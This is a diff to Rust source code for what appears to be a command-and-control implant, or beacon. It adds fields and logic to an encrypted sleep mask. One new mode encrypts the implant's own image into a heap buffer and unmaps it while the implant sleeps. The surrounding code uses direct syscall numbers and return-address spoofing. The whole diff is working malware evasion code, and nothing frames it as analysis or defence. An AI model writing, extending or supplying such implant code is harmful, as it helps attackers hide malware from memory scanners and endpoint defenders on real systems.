@@ -52,6 +52,10 @@ pub struct Instance {
     pub retspoof_imm: u8,
     /// Encrypted sleep mask parameters; None = plain indirect sleep.
     pub sleep_mask: Option<SleepMaskParams>,
+    /// Mode-0 encrypted-range bounds (page-clamped around the in-image
+    /// stub); mode 1 overwrites stub_start/stub_end with img_end per cycle.
+    pub mask_stub_start: usize,
+    pub mask_stub_end: usize,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
     pub exit_thread: unsafe extern "system" fn(u32),
     pub rng: XorShift64,
@@ -396,6 +400,11 @@ unsafe fn bootstrap() -> Option<Instance> {
         .checked_div(config::SLEEP_MS)
         .unwrap_or(0);
 
+    let (mask_stub_start, mask_stub_end) = match &sleep_mask {
+        Some(m) => (m.stub_start, m.stub_end),
+        None => (0, 0),
+    };
+
     let instance = Instance {
         watermark: config::WATERMARK,
         ntdll,
@@ -406,6 +415,8 @@ unsafe fn bootstrap() -> Option<Instance> {
         retspoof_gadget,
         retspoof_imm,
         sleep_mask,
+        mask_stub_start,
+        mask_stub_end,
         get_system_time_as_file_time: core::mem::transmute::<
             *const core::ffi::c_void,
             unsafe extern "system" fn(*mut u64),
@@ -973,6 +984,10 @@ unsafe fn ekko_sleep_inner(
     (*m).gadget = gadget as usize;
     (*m).interval = interval;
     if !instance.ekko.pool_ok {
+        // In-image stub: mode 0 with the page-clamped range bounds.
+        (*m).mode = 0;
+        (*m).stub_start = instance.mask_stub_start;
+        (*m).stub_end = instance.mask_stub_end;
         crate::runtime::sleepmask::spt_sleepmask(mask);
         return false;
     }
@@ -1030,8 +1045,25 @@ unsafe fn ekko_sleep_inner(
         set_ctx_ssn: e.set_ctx_ssn,
         resume_ssn: e.resume_ssn,
         gadget,
+        stub_ext: e.stub_ext,
+        backup: 0,
+        unmap_ssn: e.unmap_ssn,
+        alloc_ssn: e.alloc_ssn,
         dbg: instance.debug_handle,
     };
+
+    // Mode 1 (Astral Projection): the backup buffer lives on the heap and
+    // receives the encrypted image before the unmap; the stub copy runs
+    // off-image. Allocated here, freed after the worker signals done.
+    let backup = if e.stub_ext != 0 {
+        match instance.heap {
+            Some(h) => h.allocate((*m).img_end - (*m).img_base),
+            None => core::ptr::null_mut(),
+        }
+    } else {
+        core::ptr::null_mut()
+    };
+    ctx.backup = backup as usize;
 
     let mut tp_work: usize = 0;
     let tp_st = tp_alloc(
@@ -1054,6 +1086,11 @@ unsafe fn ekko_sleep_inner(
     close(h_done);
     if h_beacon_thread != 0 {
         close(h_beacon_thread);
+    }
+    if !backup.is_null() {
+        if let Some(h) = instance.heap {
+            h.deallocate(backup);
+        }
     }
     true
 }
